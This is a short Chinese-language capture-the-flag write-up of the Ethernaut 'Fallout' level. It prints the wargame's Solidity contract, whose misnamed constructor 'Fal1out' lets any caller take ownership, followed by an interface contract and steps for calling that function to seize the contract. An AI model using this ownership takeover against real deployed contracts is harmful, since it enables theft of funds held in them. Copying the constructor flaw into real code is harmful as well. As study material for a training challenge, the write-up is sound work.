---
title: ethernaut NO.2
tags: TeXt
---

# fallout

**知识点：接口函数的应用**

要求：获得合约的使用权

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    } //在0.6版本中构造函数需要用与合约相同的函数。。此为可以供我们使用的外部公开函数

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

**解法**：

利用接口函数另外再创建一个合约来调用该合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8;
interface Fallout {   
    function Fal1out() external payable ;
    function owner() external view returns (address) ;
}
```

**合约如上**

再将上个合约的地址置于

![image-20240424223334548](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240424223334548.png)

先调用Fal1out函数将合约设置为我们钱包的地址，然后再调用owner就可以查看拥有者地址